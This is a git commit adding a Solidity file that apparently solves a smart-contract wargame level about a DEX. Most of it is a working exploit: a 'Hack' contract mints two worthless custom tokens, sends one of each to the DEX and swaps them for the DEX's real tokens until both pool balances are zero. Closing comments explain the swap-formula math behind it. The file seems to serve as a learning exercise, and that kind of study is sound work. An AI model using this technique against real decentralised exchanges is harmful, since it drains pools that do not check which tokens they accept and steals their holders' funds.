90cc2c5aa79423eebdeb5e4a5bbd3f885073f6e2
Tarun Gupta <tarungupta_er@rediffmail.com>
2023-09-10 21:11:46 +0530

    Add files via upload

---
+++ 23-DEX2.sol
@@ -0,0 +1,94 @@
+pragma solidity ^0.8.13;
+
+contract Hack {
+    constructor(IDex dex) {
+        IERC20 token1 = IERC20(dex.token1());
+        IERC20 token2 = IERC20(dex.token2());
+
+        MyToken myToken1 = new MyToken();
+        MyToken myToken2 = new MyToken();
+
+        // Keep 1, send 1 to dex
+        myToken1.mint(2);
+        myToken2.mint(2);
+
+        myToken1.transfer(address(dex), 1);
+        myToken2.transfer(address(dex), 1);
+
+        myToken1.approve(address(dex), 1);
+        myToken2.approve(address(dex), 1);
+
+        dex.swap(address(myToken1), address(token1), 1);
+        dex.swap(address(myToken2), address(token2), 1);
+
+        require(token1.balanceOf(address(dex)) == 0, "dex token1 balance != 0");
+        require(token2.balanceOf(address(dex)) == 0, "dex token2 balance != 0");
+    }
+}
+
+interface IDex {
+    function token1() external view returns (address);
+    function token2() external view returns (address);
+    function swap(address from, address to, uint256 amount) external;
+}
+
+interface IERC20 {
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+}
+
+contract MyToken is IERC20 {
+    uint256 public totalSupply;
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    function transfer(address recipient, uint256 amount) external returns (bool) {
+        balanceOf[msg.sender] -= amount;
+        balanceOf[recipient] += amount;
+        emit Transfer(msg.sender, recipient, amount);
+        return true;
+    }
+
+    function approve(address spender, uint256 amount) external returns (bool) {
+        allowance[msg.sender][spender] = amount;
+        emit Approval(msg.sender, spender, amount);
+        return true;
+    }
+
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
+        allowance[sender][msg.sender] -= amount;
+        balanceOf[sender] -= amount;
+        balanceOf[recipient] += amount;
+        emit Transfer(sender, recipient, amount);
+        return true;
+    }
+
+    function mint(uint256 amount) external {
+        balanceOf[msg.sender] += amount;
+        totalSupply += amount;
+        emit Transfer(address(0), msg.sender, amount);
+    }
+
+    function burn(uint256 amount) external {
+        balanceOf[msg.sender] -= amount;
+        totalSupply -= amount;
+        emit Transfer(msg.sender, address(0), amount);
+    }
+}
+
+
+//we make a new token. 
+//and mint 2 tokens. 1 we send it to DEX. 1 is with the user(hack contract)
+//Now using the swap formula, we need to find how many tokens we need to send, in order to get 
+//100 tokens of token1.
+//amount_in*100/1 = 100 => amount_in = 1. Here denominator 1 is the balance of our new tokens in DEX.(You
+//can keep it anything, we choose 1)
+//since amount_in = 1, we send 1 token while calling swap function. Also, that's why we had to keep 1 with 
+//the user(hack contract).
